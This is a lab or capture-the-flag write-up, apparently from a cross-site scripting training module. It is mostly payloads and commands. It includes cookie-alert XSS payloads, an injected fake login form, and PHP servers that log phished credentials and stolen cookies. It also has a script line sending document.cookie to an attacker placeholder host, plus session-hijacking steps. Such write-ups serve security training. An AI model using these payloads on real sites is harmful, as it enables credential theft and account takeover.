
# Cross-Site Scripting (XSS)
---

## Question 1

**To get the flag, use the same payload as before, but modify the JavaScript to show the cookie instead of the URL.**

### Answer

**Payload**

```html
<script>alert(document.cookie)</script>
```

**Usage**

1. Inject the payload
2. Inspect → Network tab
3. Copy the generated request URL
4. Paste it into the browser address bar

**Example**

```
http://SERVER_IP:PORT/index.php?task=<script>alert(document.cookie)</script>
```

---

## Question 2

**Provide an alternative XSS payload that displays the cookie.**

### Answer

**Image-based payload**

```html
<img src="" onerror=alert(document.cookie)>
```

---

## Question 3

**Utilize automated techniques to identify the vulnerable input parameter. What is the vulnerable parameter?**

### Answer

**Tool Used**

```bash
python xsstrike.py -u "http://SERVER_IP:PORT/?fullname=hello&username=hello&password=hello&email=hello%40hello.com"
```

**Result**

* XSStrike identifies the vulnerable parameter (tool output confirms which field reflects unsanitized input)

---

## Question 4

**Find a working XSS payload for the Image URL form at `/phishing`, inject a malicious login form, steal credentials, and obtain the flag.**

### Answer

### Step 1: Confirm XSS

```html
'><script>alert(1)</script>
```

---

### Step 2: Prepare Attacker Environment

**Find VPN IP**

```bash
ip a
```

Replace with:

```
tun0 ip replace in MY\_IP
```

**Start listener**

```bash
sudo nc -lvnp 80
```

---

### Step 3: Malicious Payload (Fake Login Form)

```html
'><script>
document.write('<h3>Please login to continue</h3>\
<form action=http://MY_IP/>\
<input type="username" name="username" placeholder="Username">\
<input type="password" name="password" placeholder="Password">\
<input type="submit" value="Login">\
</form>');
document.getElementById("urlform").remove();
</script><!--
```

---

### Step 4: Host Credential Capture Script

```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
nano index.php
```

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    fclose($file);
    header("Location: http://SERVER_IP/phishing/index.php");
    exit();
}
?>
```

```bash
sudo php -S 0.0.0.0:80
```

---

### Step 5: Deliver Payload to Victim

Visit:

```
http://SERVER_IP/phishing/send.php
```

Victim credentials captured → use them to log in at:

```
/phishing/login.php
```

**Result**

* Flag obtained

---

## Question 5

**Identify the vulnerable input field and hijack the Admin session to obtain the flag.**

### Answer

### Step 1: Test Each Input Field

```html
"><script src=http://MY_IP></script>
```

Test individually:

```html
"><script src=http://MY_IP/name></script>
"><script src=http://MY_IP/user></script>
"><script src=http://MY_IP/password></script>
"><script src=http://MY_IP/picture></script>
```

**Vulnerable Field Identified**

```
picture
```

---

### Step 2: Cookie Stealing Server

```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
nano index.php
```

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $cookie) {
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: ".urldecode($cookie)."\n");
        fclose($file);
    }
}
?>
```

```bash
nano script.js
```

```javascript
new Image().src='http://MY_IP/index.php?c='+document.cookie;
```

```bash
sudo php -S 0.0.0.0:8080
```

---

### Step 3: Inject Payload

```html
"><script src=http://MY_IP/script.js></script>
```

---

### Step 4: Session Hijacking

1. Copy captured cookie from `cookies.txt`
2. Browser → DevTools → Storage → Cookies
3. Insert cookie manually
4. Refresh page

**Result**

* Admin session hijacked
* Flag obtained

---

## Skills Assessment

### Question

**Identify an XSS vulnerability, execute JavaScript, hijack a session, and retrieve the `flag` cookie. What is its value?**

### Answer

### Vulnerable Field Testing

```html
"><script src=http://MY_IP/comment></script>
"><script src=http://MY_IP/name></script>
"><script src=http://MY_IP/website></script>
```

**Vulnerable Field**

```
website
```

---

### Cookie Capture (Same Method)

* Use `script.js` and `index.php`
* Inject payload into vulnerable field
* Capture cookies via listener

```bash
cat cookies.txt
```

**Result**

```
flag=<FLAG_VALUE>
```

---